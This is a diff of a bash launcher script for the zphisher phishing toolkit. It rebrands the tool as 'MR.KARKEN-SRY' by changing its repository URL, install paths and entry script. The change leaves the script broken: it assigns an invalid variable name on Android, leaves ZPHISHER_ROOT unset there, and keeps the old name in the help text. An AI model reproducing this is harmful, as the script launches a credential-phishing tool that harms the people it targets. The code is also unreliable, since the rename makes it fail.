@@ -1,15 +1,15 @@
 #!/bin/bash
 
-# https://github.com/htr-tech/zphisher
+# https://github.com/htr-tech/MR.KARKEN-SRY
 
 if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
+	MR.KARKEN_ROOT="/data/data/com.termux/files/usr/opt/MR.KARKEN-SRY"
 else
-	export ZPHISHER_ROOT="/opt/zphisher"
+	export ZPHISHER_ROOT="/opt/MR.KARKEN-SRY"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
-	echo "To run Zphisher type \`zphisher\` in your cmd"
+	echo "To run Zphisher type \`MR.KARKEN-SRY\` in your cmd"
 	echo
 	echo "Help:"
 	echo " -h | help : Print this menu & Exit"
@@ -28,5 +28,5 @@ elif [[ $1 == '-i' || $1 == 'ip' ]]; then
 	}
 else
 	cd $ZPHISHER_ROOT
-	bash ./zphisher.sh
+	bash ./KARKEN.sh
 fi
